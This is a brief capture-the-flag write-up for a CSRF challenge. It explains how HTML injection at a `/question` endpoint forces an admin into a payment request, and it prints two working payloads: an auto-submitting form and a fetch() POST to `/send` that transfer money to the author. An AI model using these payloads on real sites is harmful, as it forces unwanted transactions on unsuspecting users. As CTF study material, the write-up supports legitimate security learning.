## 2022 Final CSRF
### Author: melon

* Find sitemap.xml, which reveals `/question`, which is vulnerable to HTML injection
* Through that endpoint we can cause the user to be forced to make a fake payment request
* Then, we report the url and replace it with the `/question?...` payload we created
* NOTE: THE COOKIE MUST BE HTTPONLY, or else you can just steal the admin's session, it's not intended to be an XSS challenge

* Both of the following payloads will work (an actual CSRF-style HTML payload, or copy pasting the javascript code that's actually used)
```html
<form id="bad-form" name="form" method="POST" action="/send">
	<input type="text" name="to" value="melon">
	<input type="text" name="amount" value="50">
	<input type="submit" value="transfer">
</form>
<script>
	document.addEventListener('DOMContentLoaded', document.getElementById('bad-form').submit());
</script>
```

```html
<script>
fetch('/send', { 
	method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: 'melon', amount: 50 })});
</script>
```